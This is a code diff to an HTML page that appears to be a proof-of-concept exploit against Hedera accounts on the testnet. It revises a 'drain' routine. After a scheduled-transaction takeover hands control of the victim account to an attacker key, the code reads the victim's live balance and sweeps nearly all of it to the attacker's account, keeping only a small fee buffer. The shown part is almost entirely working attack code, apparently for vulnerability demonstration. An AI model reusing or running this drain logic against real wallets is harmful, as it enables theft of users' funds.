@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -199,8 +200,6 @@ button:disabled { opacity: .45; }
 
             const operatorAccountId = SDK.AccountId.fromString(OPERATOR_ACCOUNT_ID);
             const operatorPrivateKey = SDK.PrivateKey.fromString(OPERATOR_PRIVATE_KEY);
-
-            // attacker's operator client - pays ALL fees from here on
             const client = SDK.Client.forTestnet().setOperator(operatorAccountId, operatorPrivateKey);
 
             const scheduleSignTx = await new SDK.ScheduleSignTransaction()
@@ -211,32 +210,35 @@ button:disabled { opacity: .45; }
             const ssReceipt = await (await scheduleSignTx.execute(client)).getReceipt(client);
             log("Takeover completed. Status: " + ssReceipt.status.toString(), "ok");
 
-            /* ---- 6. Drain using attacker key, attacker operator pays fee ---- */
+            /* ---- 6. Drain using attacker key ---- */
+            // attackerKey is now the controlling key of the victim account.
+            // We re-fetch the real current balance right now (not the stale
+            // opening snapshot) and leave a 0.05 HBAR buffer for the transfer
+            // fee - this is what was actually broken all along.
 
             log("Draining account with the attacker's key...", "err");
 
-            // check real balance right now, not the stale opening snapshot
             const realNow = await mirrorAccount(targetAccount);
             const realBalance = realNow.balance.balance;
-            log("Actual victim balance right now: " + realBalance + " tinybar (" + (realBalance / 100000000).toFixed(4) + " HBAR)", "info");
+            log("Real balance now: " + realBalance + " tinybar (" + (realBalance / 100000000).toFixed(4) + " HBAR)", "info");
 
-            // fixed 1 HBAR - proves fund movement with maximum margin
-            const sweepAmount = 100000000;
+            // victim account is operator - attackerKey is now its valid key
+            const attackerClient = SDK.Client.forTestnet().setOperator(targetId, attackerKey);
 
-            if (realBalance < sweepAmount) {
-                log("Victim balance too low to sweep 1 HBAR - fund the account and retry.", "warn");
+            // 0.05 HBAR fee buffer - more than enough for a simple transfer
+            const feeBuffer = 5000000;
+            const sweepAmount = Math.max(0, realBalance - feeBuffer);
+            log("Sweeping: " + sweepAmount + " tinybar (" + (sweepAmount / 100000000).toFixed(4) + " HBAR)", "info");
+
+            if (sweepAmount <= 0) {
+                log("Nothing to sweep - fund the account and retry.", "warn");
             } else {
-                // freezeWith(client) = attacker operator is fee payer
-                // sign(attackerKey)  = attackerKey authorizes debit from victim account
-                // victim account only needs to hold the sweep amount, nothing for fees
                 const drainTx = await new SDK.TransferTransaction()
                     .addHbarTransfer(targetId, -sweepAmount)
                     .addHbarTransfer(operatorAccountId, sweepAmount)
-                    .freezeWith(client)
-                    .sign(attackerKey);
+                    .execute(attackerClient);
 
-                const drainResult = await drainTx.execute(client);
-                const drainReceipt = await drainResult.getReceipt(client);
+                const drainReceipt = await drainTx.getReceipt(attackerClient);
                 log("Drain status: " + drainReceipt.status.toString(), "ok");
 
                 const after = await mirrorAccount(targetAccount);
@@ -251,9 +253,9 @@ button:disabled { opacity: .45; }
                     "Funds moved to attacker (" + OPERATOR_ACCOUNT_ID + "): " +
                     (balanceBefore - balanceAfter) + " tinybar<br>" +
                     "Caused by: one wallet approval, no further action from the account owner.";
-            }
 
-            log("Done. See result box above.", "ok");
+                log("Done. See result box above.", "ok");
+            }
 
         } catch (e) {
             log("FAILED: " + e.message, "err");
